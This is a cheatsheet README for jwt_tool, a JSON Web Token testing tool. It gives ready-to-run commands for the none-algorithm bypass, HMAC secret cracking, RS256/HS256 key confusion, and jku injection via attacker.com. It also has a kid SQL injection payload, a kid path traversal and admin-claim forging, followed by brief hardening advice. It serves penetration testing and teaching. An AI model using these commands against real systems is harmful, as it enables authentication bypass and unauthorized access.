# 🪙 jwt_tool - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```

<p align="center">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🪙 Powerful Python CLI toolkit for analyzing, tampering, forging, scanning, and cracking JSON Web Tokens (JWT)</b>
</p>

---

## 📋 Table of Contents

- [Overview & JWT Anatomy](#-overview--jwt-anatomy)
- [Installation](#-installation)
- [Token Parsing & Inspection](#-token-parsing--inspection)
- [Automated Vulnerability Scanning (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Common Exploitation Scenarios](#-common-exploitation-scenarios)
  - [Algorithm Confusion / None Attack (`none`)](#algorithm-confusion--none-attack-none)
  - [HMAC Secret Key Cracking](#hmac-secret-key-cracking)
  - [Key Confusion: RS256 to HS256 with Public Key](#key-confusion-rs256-to-hs256-with-public-key)
  - [Header Injection: JKU, X5U & JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
  - [KID Injection (SQLi & Path Traversal)](#kid-injection-sqli--path-traversal)
- [Payload Tampering & Forging Claims](#-payload-tampering--forging-claims)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & JWT Anatomy

A JSON Web Token (RFC 7519) consists of three Base64URL-encoded segments separated by dots (`.`):
`header.payload.signature`

1. **Header:** Identifies token type (`typ`) and signing algorithm (`alg`, e.g., `HS256`, `RS256`, `none`).
2. **Payload:** Contains user claims (`sub`, `role`, `admin`, `exp`).
3. **Signature:** Cryptographic verification hash preventing client-side tampering.

Created by **ticarpi**, **jwt_tool** automates testing for architectural and implementation flaws in JWT authentication workflows across APIs and modern web applications.

---

## 📥 Installation

```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```

---

## 🔍 Token Parsing & Inspection

Decode and inspect header parameters and payload claims:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```

---

## ⚡ Automated Vulnerability Scanning (`-M at`)

Launch automated playbook scans testing known vulnerabilities against a target web service:

```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Tests executed:*
- Signature stripping (None algorithm variants)
- RSA to HMAC key confusion
- Claim tampering (`admin=true`, privilege escalation)
- Injection into `kid`, `jku`, `x5u` headers
- Empty signature handling

---

## 💥 Common Exploitation Scenarios

### Algorithm Confusion / None Attack (`none`)
When backend implementations accept unsigned tokens:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Variants tested automatically:* `none`, `None`, `NONE`, `nOnE`.

### HMAC Secret Key Cracking
When HS256/HS384/HS512 uses a weak passphrase:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

### Key Confusion: RS256 to HS256 with Public Key
If the server signs with RSA (RS256) but accepts HMAC (HS256) using its public certificate as the shared HMAC key:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```

### Header Injection: JKU, X5U & JWK Spoofing
Injecting attacker-controlled keys or URLs:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```

### KID Injection (SQLi & Path Traversal)
If the backend uses the `kid` (Key ID) header parameter directly in database queries or file paths:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```

---

## ✍️ Payload Tampering & Forging Claims

Modify specific claim values and resign the token:

```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Decode & Parse Token** | `python3 jwt_tool.py <JWT>` |
| **All-in-One Playbook Scan** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Crack HMAC Secret** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Bypass with None Algorithm** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 Confusion** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Tamper Payload & Sign** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **KID Path Traversal** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Defensive Considerations & Hardening

1. **Strict Algorithm Whitelisting:** Never accept `none` or algorithm switching. Explicitly verify expected algorithms (`RS256` only).
2. **Reject Client-Controlled Keys:** Do not blindly trust `jku`, `jwk`, or `x5u` headers from untrusted input without strict domain allowlists.
3. **Use Strong Secrets:** Ensure HMAC keys are at least 256 bits of high-entropy cryptographic random bytes.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> jwt_tool is designed strictly for authorized penetration testing, API vulnerability assessments, and educational research. Forging tokens to access unauthorized systems without written permission is strictly illegal.
